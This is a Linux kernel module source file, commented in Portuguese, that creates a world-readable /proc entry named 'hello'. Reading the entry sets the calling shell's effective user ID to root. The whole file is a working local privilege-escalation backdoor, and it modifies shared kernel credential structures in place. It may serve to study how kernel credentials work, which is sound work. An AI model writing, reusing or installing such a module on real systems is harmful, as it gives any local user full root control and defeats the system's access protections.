#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>


static int hello_show(struct seq_file *m, void *v) {
  // Imprime os pids do processo e do processo pai.
 seq_printf(m, "O id/pid do processo atual: %d\n", current->pid);
 seq_printf(m, "O id/pid do processo pai: %d\n", current->parent->pid);

 // Altera a credencial do interpretador de comandos (pai) para root.
 struct cred *cred = (struct cred*) get_cred(current->parent->cred);
 cred->euid = GLOBAL_ROOT_UID;
 put_cred(cred);

 seq_printf(m, "O privilegio do processo pai e: %u\n", current->parent->cred->euid.val);

 return 0;
}

static int hello_open(struct inode *inode, struct file *file) {
  return single_open(file, hello_show, NULL);
}

static const struct file_operations hello_fops = {
  .owner	= THIS_MODULE,
  .open	        = hello_open,
  .read	        = seq_read,
  .llseek	= seq_lseek,
  .release	= single_release,
};

int init_module(void) {
  if (!proc_create("hello", 0644, NULL, &hello_fops)) {
    printk("Problema com o módulo!\n");
    return -ENOMEM;
  }
  printk("Módulo carregado!\n");
  return 0;
}

void cleanup_module(void) {
  remove_proc_entry("hello", NULL);
  printk("Módulo descarregado!\n");
}

MODULE_LICENSE("GPL");
